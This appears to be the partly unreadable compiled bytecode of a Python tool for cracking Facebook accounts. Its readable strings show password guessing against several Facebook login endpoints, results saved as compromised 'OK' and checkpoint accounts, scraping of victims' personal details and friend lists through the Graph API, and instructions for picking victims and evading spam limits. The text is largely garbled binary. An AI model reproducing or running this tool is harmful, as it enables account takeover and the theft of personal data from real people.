  �kor<   rp   rq   ro   r0   rr   r|   rq  rz   r�   �
splitlines�fsr�   �flr�   r�   �pwlist�start_methodezzr�   r�   r�   r8   r9   r�   r�   r�   �start_method�startedr   �map�api_opsi�remover:   r  �mbasic_opsi�mbasic�	free_opsi�free)�self�filesr�   r-   r�   Zkopi�put�pufr.   r.   r/   �__init__c  s>  
��

���
��

0�

0�

0�



0�
















��� ��zcrack.__init__c                 C   sv  t dttttf ��d�| _t| j�dkr| ��  d S | jD ]
}|�d| ji� qt	�  t dttttf �}t
dt � |dv rOtdttttf � t�  d S |d	v r�t
d
ttttf � t dttttf �}|dv rztdttttf � t�  d S |dv r�t�  td��| j| j� t�| j� t�  d S |dv r�t�  td��| j| j� t�| j� t�  d S tdttttf � t�  d S |dv �r6t
dttttf � t dttttf �}|dv r�tdttttf � t�  d S |dv �r
t�  td��| j| j� t�| j� t�  d S |dv �r't�  td��| j| j� t�| j� t�  d S tdttttf � t�  d S |dv �r�t
dttttf � t dttttf �}|dv �rctdttttf � t�  d S |dv �r�t�  td��| j| j� t�| j� t�  d S |dv �r�t�  td��| j| j� t�| j� t�  d S tdttttf � t�  d S tdttttf � t�  d S )Nz %s[%s%s] %sEnter Password : r�   r   r|  rC   rD   rE   rf   rG   z*%s[%s%s] %sBring up  CP2 Option? [y/t]r}  �   r�  rP   z)%s[%s%s] %sBring up CP2 option? [y/t]rc   )ro   rp   rq   r�   r|  r�   r�  r�  r(  r�  r<   r0   rr   r|   r�  r   r�  r�  r8   r�  rq  r:   r  r�  r�  r�  r�  )r�  r�   r�  r�  r.   r.   r/   r�  �  s�   





















zcrack.pwlistc           
      C   s�  �z7|� d�D �]}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q
 ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q
|� d�dk�r	t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q
q|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nr|  r�   �https://b-api.facebook.comr�   r
  r�   r�   rM   r�   �birthday�/�&%s[%sMR.X-CP2%s] %s  %s  %s %s %s%s�%s%s%s%s%s�
CP2/%s.txt�a+�%s%s%s%s%s
r�   � %s[%sMR.X-CP2%s] %s  %s%s     �%s%s�%s%s
r  � %s[%sMR.X-OK1%s] %s  %s%s     �
OK1/%s.txtr!   �3%s[%sCrack%s][%s%s/%s%s][%sOK1:%s%s][%sCP2:%s%s]%s��end)rv   r  ru   rz   r�   rw   rx   ry   r�   �	bulan_ttlr<   rp   rq   ry  r
  r�   �tanggalr'   r}   r~   �Hr�  r�  r�   r�  r%   r&   r(   r  �
r�  r�  r�   �log�ke�tt�ttlrz  rj   r�   r.   r.   r/   r  A  sF   
�&. (("("Pz	crack.apic           
      C   s�  �z;|� d�D �]}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�rt
dttt|� d�|t|� d��f � t
d� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nr|  r�   r�  r�   r
  r�   r�   rM   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r  r�  rF   r�  r!   r�  r�  )rv   r  ru   rz   r�   rw   rx   ry   r�   r�  r<   rp   rq   ry  r
  r�   r�  r'   r}   r~   r�  r�  r�  r�   r�  r%   r&   r(   r�  r�  r.   r.   r/   r�  e  sH   
�&. (("("Pzcrack.api_opsic                 C   �  �z@|� d�D �]
}t|� d�|d�}|� d�dkr�zht� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }t
dttt|� d�||||	t|� d��f	 � | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q ttfy�   d}d}d}	Y n   Y t
dttt|� d�|t|� d��f � | j�d|� d�|f � tdt d��d|� d�|f �  �q|� d�dk�rdttt|� d�|t|� d��tf }
t|
t|� d��� | j�d|� d�|f � tdt d��d|� d�|f �  �qq|  jd7  _t
dtttt| jt| j�ttt| j�ttt| j�ttf dd� tj��  W d S    | �|� Y d S )Nr|  r�   r
   r�   r
  r�   r�   rM   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r  �"%s[%sMR.X-OK1%s] %s  %s%s%s     rb   r�  r!   r�  r�  )rv   r3  ru   rz   r�   rw   rx   ry   r�   r�  r<   rp   rq   ry  r
  r�   r�  r'   r}   r~   r�  rs  rm  r�  r�  r�   r�  r%   r&   r(   r�  �r�  r�  r�   r�  r�  r�  r�  rz  rj   r�   rp  r.   r.   r/   r�  �  �H   
�&. (("&"Pzcrack.mbasicc                 C   ��  �zZ|� d�D �]$}t|� d�|d�}|� d�dkr�zst� d|� d� d tdd	���  �}t�|j�}|d
 }|�d�\}}}	t	| }dt
tt
|� d�||||	t|� d��f	 }
t|� d�||
� td� | j�d|� d�||||	f � tdt d��d|� d�||||	f � W  �q- ttfy�   d}d}d}	Y n   Y dt
tt
|� d�|t|� d��f }
t|� d�||
� td� | j�d|� d�|f � tdt d��d|� d�|f �  �q-|� d�dk�r,dttt|� d�|t|� d��tf }t|t|� d��� td� | j�d|� d�|f � tdt d��d|� d�|f �  �q-q|  jd7  _tdt
tt
t| jt| j�t
tt| j�t
tt| j�t
tf dd� tj��  W d S    | �|� Y d S )Nr|  r�   r
   r�   r
  r�   r�   rM   r�   r�  r�  r�  rF   r�  r�  r�  r�  r�   r�  r�  r�  r  r�  rb   r�  r!   r�  r�  ) rv   r3  ru   rz   r�   rw   rx   ry   r�   r�  rp   rq   ry  rf  r<   r
  r�   r�  r'   r}   r~   r�  rs  rm  r�  r�  r�   r�  r%   r&   r(   r�  �r�  r�  r�   r�  r�  r�  r�  rz  rj   r�   rZ  rp  r.   r.   r/   r�  �  �R   
�&* ($"&"Pzcrack.mbasic_opsic                 C   r�  )Nr|  r�   �https://free.facebook.comr�   r
  r�   r�   rM   r�   r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r  r�  rb   z
OK2/%s.txtr!   r�  r�  )rv   r5  ru   rz   r�   rw   rx   ry   r�   r�  r<   rp   rq   ry  r
  r�   r�  r'   r}   r~   r�  rs  rm  r�  r�  r�   r�  r%   r&   r(   r�  r�  r.   r.   r/   r�  �  r�  z
crack.freec                 C   r�  )Nr|  r�   r�  r�   r
  r�   r�   rM   r�   r�  r�  r�  rF   r�  r�  r�  r�  r�   r�  r�  r�  r  r�  rb   r�  r!   r�  r�  ) rv   r5  ru   rz   r�   rw   rx   ry   r�   r�  rp   rq   ry  rf  r<   r
  r�   r�  r'   r}   r~   r�  rs  rm  r�  r�  r�   r�  r%   r&   r(   r�  r�  r.   r.   r/   r�  �  r�  zcrack.free_opsiN)�__name__�
__module__�__qualname__r�  r�  r  r�  r�  r�  r�  r�  r.   r.   r.   r/   r�   b  s     I$%%*%r�   c               	   C   s�  z	t dd��� } W n ttfy!   tdttttf � t�  Y nw tdt	tt	tf �}zt
�d| d |  �}t�|j�}W n ttfyW   tdttttf � t�  Y nw z|d }W n ttfyk   d	}Y nw z|d
 }W n ttfy   d	}Y nw z|d }W n ttfy�   d	}Y nw z|d }W n ttfy�   d	}Y nw z|d }W n ttfy�   d	}Y nw z|d }	W n ttfy�   d	}	Y nw z|d }
W n ttfy�   d	}
Y nw z|d }W n ttfy�   d	}Y nw z|d }W n ttf�y   d	}Y nw z|d }W n ttf�y!   d	}Y nw z|d }W n ttf�y6   d	}Y nw z|d d }W n ttf�yM   d	}Y nw z|d d }W n ttf�yd   d	}Y nw z|d d }W n ttf�y{   d	}Y nw z|d }W n ttf�y�   d	}Y nw z|d }W n ttf�y�   d	}Y nw tdt	tt	t|f � tdt	tt	t|f � tdt	tt	t|f � tdt	tt	t|f � tdt	tt	t|f � tdt	tt	t|	f � tdt	tt	t|
f � td t	tt	t|f � td!t	tt	t|f � td"t	tt	t|f � td#t	tt	t|f � td$t	tt	t|f � td%t	tt	t|f � td&t	tt	t|f � td't	tt	t|f � td(t	 � td)t	tt	tf � t�  d S )*NrM   r�   r�   r�   r�   r�   z!%s[%s!%s] %sID Tidak DitemukanrL   r�   r�   Zmiddle_name�	last_namer�  Zgenderr�   �linkr�   ZreligionZrelationship_statusZsignificant_other�locationZhometownZaboutr  z"%s[%s%s] %sNAME           : %sz"%s[%s%s] %sFIRST NAME     : %sz"%s[%s%s] %sMIDDLE NAME    : %sz"%s[%s%s] %sLAST NAME      : %sz"%s[%s%s] %sBIRTHDAY       : %sz"%s[%s%s] %sGENDER         : %sz"%s[%s%s] %sEMAIL          : %sz"%s[%s%s] %sLINK           : %sz"%s[%s%s] %sUSERNAME       : %sz"%s[%s%s] %sMERETIAL STATUS: %sz"%s[%s%s] %sRELARION WITH  : %sz"%s[%s%s] %sCURRENT CITY   : %sz"%s[%s%s] %sHOMETOWN       : %sz"%s[%s%s] %sABOUT          : %sz"%s[%s%s] %sLOCALE         : %srD   rg   )rz   r�   r}   r~   r0   rr   rq   rs   ro   rp   ru   rv   rw   rx   ry   r|   r<   )r�   ZidtZzxZzy�nmZnd�nt�nb�ut�gdr  Zlk�usZrgZrlZrls�lcZht�ab�lor.   r.   r/   r�   (  sp   0&0
r�   c               	   C   s�  t dttttf �} z%tdd��� }t�d| |f �}t�|j	�}t
dtttt|d f � W n ttfyG   tdttttf � t�  Y nw g }g }t dttttf �}t
d	ttf � t�d
| ||f �}t�|j	�}|d D ]	}	|�|	d � qr|D ]K}
z<t�d|
|f �}t�|j	�}z|d D ]	}|�|d � q�W n ty�   t
d� Y nw t
d|
dt|�� |��  W q~ ty�   t
d� Y q~w t
d� t d� t�  d S )Nr�   rM   r�   z-https://graph.facebook.com/%s?access_token=%sr�   rL   r�   z%s[%s%s] %sLimit Dump : r�  r�   r�   r�   z5https://graph.facebook.com/%s/friends?access_token=%sz[!] Privatez[]r�   z[!] Spam Accountsz[ Return ])ro   rp   rq   rz   r�   ru   rv   rw   rx   ry   r<   r}   r~   r0   rr   rs   r�   r�   r3   r|   )r�   r�   �mm�nnr�  �teZlimr�  Zidir�   r�   Zada2Zidi2rS   r.   r.   r/   r�   a  sJ   
����
r�   c               	   C   s2  t �  t�  tdtttf � tdt � tdttttf � tdttttf � tdttttf �} | dv rFtdttttf � t�  �n>| dv r�z}t	�
d	�}tdt � td
tttf � tdt � |D ]}tdtttt|f � qgtdt � tdttttf �}td� |dkr�tdttttf � t�  t	�d| � td| ��� �� }d| �dd��dd�}tdtttt|t|�f � W �q� ttfy�   tdtttf � Y �q�w | dv �rwz~t	�
d�}tdt � tdtttf � tdt � |D ]}tdtttt|f � q�tdt � tdttttf �}td� |dk�r3tdttttf � t�  t	�d| � td| ��� �� }d| �dd��dd�}tdtttt|t|�f � W �q� ttf�yv   tdtttf � Y �q�w tdttttf � t�  tdt � tdttttf � t�  d S )Nz%s[ %sCrack Results %s]rD   z%s[%s1%s] %sCheck Result OK1z%s[%s2%s] %sCheck result CP2rC   rE   rf   rG   �OK1z,%s[%s Crack Results Stored in File OK1%s]z%s[%s%s] %s%sz!%s[%s%s] %sEnter File Name : rF   z%s[%s!%s] %sCorrect Contentz
cat OK1/%szOK1/%sz%sr�   r�   z.txtz8
%s[%s%s] %sTotal Crack Result Date %s is %s Accountz%s[%s No Results Found %s]rP   �CP2z.%s[%s Crack Results Stored in CP2 Files %s]z
cat CP2/%szCP2/%srg   )r3   r=   r0   rp   rq   r<   ro   rr   r|   r8   �listdirr�   r9   rz   r�   r�  r�   r�   r}   r~   )�chZokl�filer�  ZpppZdel1Zcplr.   r.   r/   r�   �  sr   

"�


"�
r�   c                 C   s�  d}t �� }|j�dddtd|dddd	d
dtd ddd�� i }t|jtd d|id�jd�}|�dddi�}g d�}|�	d�D ]}|�d�|v rW|�|�d�|�d�i� q@q@|�| |d�� zt|j
t|�d� |dd�jd�}	W n t jjy�   tdttttf � Y nw d|jv r�td ttttf � d S d!|jv �r#|	�d�}
|
�ddd"i�d }|
�ddd#i�d }|
�ddd$i�d }||||d%d&|d'�}t|j
t|
d  |d(�jd�}d)d*� |�	d+�D �}tt|��d,kr�td-ttttf � ntd.tttttt|��f � tt|��D ]}td/t|d0 �d1 ||  � �qd S d2t|	�v �rC|	�d3d4d2i��d3�j}td5tttt|f � d S td6ttttf � d S )7Nzrmozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56r  rU   rH   r   r6  r7  r8  r9  r:  r;  r<  r  rT   r=  rW   r�   r  r>  r?  r,  r@  ro   rL   r   rB  rC  TrD  z%s[%s!%s] %sSpam Accountsr$  z%%s[%s%s] %sAccount OK No Checkpointtr&  r"  rA  rF  rF   rG  rH  r#  c                 S   rI  r.   rJ  rK  r.   r.   r/   rN  �  rO  zlog_hasil.<locals>.<listcomp>rP  rk   z%s[%s%s] %sOne Tap Accountz%s[%s%s] %sThereis %s Option z   r!   rQ  rR  Zdivr�   z%s[%s!%s] %s%sz %s[%s!%s] %sPassword Has Changed)ru   r  ra   r(  rY   rS  rv   ry   rT  rU  r,  r   rV  r<   rr   rq   rb   r�  r  r�   rp   rW  )rX  rY  r�   r\  r�   r]  r^  r-  r�   r_  r>  r`  ra  rF  rb  rc  rd  re  Zohr.   r.   r/   �	log_hasil�  sx   �&�

�	"�r�  c               	   C   sj  t dtttf � tdt � tdtttttf � tdttttf �} z	t| d��� }W n tyH   tdt	tt	tf � t
�d� t�  Y nw tdtttttt|��f � td	� |D ]3}|�d
d	�}|�d�}tdtttt|f � zt|d |d � W n tjjy�   Y q^w td	� q^td	� tdttttf � tdt � tdttttf � t�  d S )Nz/%s[ %sCheck Crack Result Account Options %s]rD   z(%s[%s%s] %sExample File : CP2/%s.txtz%s[%s%s] %sFile : r�   z %s[%s!%s] %sFile Not Existingr�   z&%s[%s%s] %sNumber of Accounts : %srF   r#   r�   z%s[%s%s] %sCheck Login : %sr   r!   z)%s[%s%s] %s Checking Process Completerg   )r0   rp   rq   r<   r�  ro   rz   �	readlines�FileNotFoundErrorrr   r)   r*   r�   r  r�   r�   r�   r�  ru   r   r   r|   )r�  Z	buka_bajuZmemekZkontolZtitidr.   r.   r/   r�   �  s6   �
�

r�   c                   C   s^   t dtttf � t dt � t dttttf � t dttttf � t dttttf � d S )Nz %s[ %sSelect Method Login %s]rD   z%s[%s1%s] %sLogin with Tokenz$%s[%s2%s] %sScript Usage Tutorialz%s[%s0%s] %sGo Back�r<   rp   rq   r.   r.   r.   r/   rn     s
   rn   c                   C   sr   t dtttf � tdt � tdttttf � tdttttf � tdttttf � tdttttf � d S )Nz%s[%s Tips & Tutorial %s]rD   z %s[%s1%s] %sHow to Take Tokenz"%s[%s2%s] %sHow to Take Cookiesz %s[%s3%s] %sHow to Get Targetz,%s[%s4%s] %sWays During the Crack Process�r2   rp   rq   r<   r.   r.   r.   r/   r�     s   r�   c                   C   s�   t dt � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t d	tttttf � t d
tttttf � t dt � tdt � d S )N�>%szN%s %s1 %s %sPrepare a Sacrificial Account In Chrome For Cracking Process %szC%s %s2 %s %sChange the Victim Account Password First          %szL%s %s3 %s %sFind Random Account Targets, Friends List Must Be Public   %szG%s %s4 %s %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %sz6%s %s5 %s %sMore Friends, More Possible Results  %szE%s %s6 %s %sTap Target Profile/Cover Photo                      %sz>%s %s7 %s %ssee URL/Link Above, There is \ id = 10001xx\ %sz:%s %s8 %s %sWell, thats a target ID ready to crack   %szE%s %s9 %s %sOpen Termux/Linux then proceed to the Crack Process %srD   r�  r.   r.   r.   r/   r�   #  s   r�   c                   C   s�   t dt � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dtttttf � t dt � tdt � d S )	Nr�  zD%s %s1 %s %sMethod Api : Fast But Easy Process Spam            %szL%s %s2 %s %sMethod Mbasic : The process is quite fast, rarely spammed  %sz<%s %s3 %s %sMethod Mobile : Slow Process, Probably OK  %sz<%s %s4 %s %sCrack Using Data Quota (Not Support Wifi)  %szK%s %s5 %s %sIf Results Do Not Appear While The Crack Is Running       %szH%s %s6 %s %sTurn On Airplane Mode Only 5 Seconds                   %srD   r�  r.   r.   r.   r/   r�   0  s   r�   c                	   C   s�   t dttttf � t dtttttttf � t dtttttttf � t dttttf � t dttttf � t dttttf � d S )Nz%s[%s1%s] %sGet User Agentz.%s[%s2%s] %sChange User Agent%s(%sManual%s)z2%s[%s3%s] %sChange User Agent %s(%sAdjust HP%s)z %s[%s4%s] %sDelete User Agentz%s[%s5%s] %sCheck User Agentz%s[%s0%s] %sReturnr�  r.   r.   r.   r/   r�   :  s   r�   c                   C   sL   t dt � t dttttf � t dttttf � t dttttf � d S )NrD   z%s[%s1%s] %sMethod Api[Free]z#%s[%s2%s] %sMethod Mbasic[Pro 1]z %s[%s3%s] %sMethod [PRO 2] FBr�  r.   r.   r.   r/   r�  A  s   r�  c                	   C   sr   t dt � t dtttttttf � t dtttttttf � t dtttttttf � t dttttf � d S )NrD   z/%s[%s1%s] %sFast Crack [Free] %s[%s6 pass%s]z0%s[%s2%s] %sSlow Crack [PRO 1] %s[%s9 pass%s]z6%s[%s3%s] %sVery Slow Crack [PRO 2] %s[%s12 pass%s]z%%s[%s4%s] %sCrack Password Combiner�  r.   r.   r.   r/   r�  F  s
   r�  c                   C   sd   t dt � t dttttf � t dtttttf � t dtttttf � t dttttf � d S )NrD   z"%s[%s%s] %sCrack Is Running...z0%s[%s%s] %sAccount [OK1] Saved To OK1/%s.txtz0%s[%s%s] %sAccount [CP2] Saved To CP2/%s.txtzG%s[%s%s] %sActivate Airplane Mode [5 Seconds Only] Every 5 Minutes
)r<   rp   rq   r�  r.   r.   r.   r/   r�  L  s
   r�  c                   C   s6   zt �d� W n   Y zt �d� W d S    Y d S )Nr�  r�  )r8   �mkdirr.   r.   r.   r/   �folderR  s   r�  �__main__zgit pull)pru   r)  r%   r8   r  r)   r�   rw   Zuuid�
subprocess�	threading�urllib�getpassrq   rr   r�  �K�B�Urp   �NZmultiprocessing.poolr   Zconcurrent.futuresr   Zrequests.exceptionsr   Z	mechanizer   r   rS  r   r   �urllib.parser	   r�   rY   �okr
  r�  �now�current�year�ta�monthZbu�dayZhar�  Zbulanry  r:   ZbuTemp�
ValueError�opr�  r�   r�   r�   r�   r�   r�   r�   r�   r0   r2   r3   r;   r=   Zloopro   r�   r  r<   r9   rA   rs   r|   rt   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r3  r5  rf  rm  rs  r�   r�   r�   r�   r�  r�   rn   r�   r�   r�   r�   r�  r�  r�  r�  r�  r.   r.   r.   r/   �<module>   s�   h
�

�pg1"000 >
   I9"9?


